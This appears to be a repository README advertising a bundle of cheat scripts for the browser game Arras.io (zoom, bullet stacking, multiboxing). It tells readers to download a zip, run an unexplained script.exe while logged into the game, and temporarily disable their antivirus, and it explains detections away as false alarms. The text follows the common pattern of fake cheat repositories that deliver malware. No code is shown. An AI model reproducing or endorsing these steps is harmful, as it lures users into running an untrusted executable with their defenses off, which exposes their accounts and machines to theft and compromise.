üîß Arras.io Script Bundle

‚≠ê If you find this project useful, please consider starring the repository to show your support!

‚úÖ What's Included?

After extensive development, I‚Äôve completed a full suite of powerful scripts for Arras.io, including:

- FOV Zoom Control

- Max Drone Health Enhancements

- Bullet Stack (Pentashot, Spreadshot, Octotank)

- Multibox Controller

- Lag reducer

üì¶ Installation Guide:

üëâ [Download here arras-pack.zip](https://github.com/annonymousdev9/arrasio-script-bundle/releases/download/v1.0.0/arras_scripts_bundle.zip)

- Download the repository as a ZIP file

- Extract all files to a folder

- Run script.exe to launch the system

 
‚ö†Ô∏è Important:

Running individual scripts separately will not work ‚Äî many required classes/modules are only defined inside the script.exe.

Launching only the .exe without the accompanying JS files will also result in errors.

All JavaScript scripts have been packaged into a single Python .exe. When launched, they work seamlessly with Arras.io

üîß Requirements

1- You must be logged into arras.io before launching the script

2- Wait 5 seconds after launching, then reload the game

3- If it doesn't work: Do NOT spam launch the .exe

4- Disable your antivirus/system defender temporarily, as it may block the scripts (see below)

‚ùì Why Might Antivirus/system defender Block It?

Heuristic Detection: Injecting or modifying code in the browser can look suspicious to antivirus tools/defender

Script Injection Behavior: Mimicking cheat-like behavior (even in test environments) may be flagged
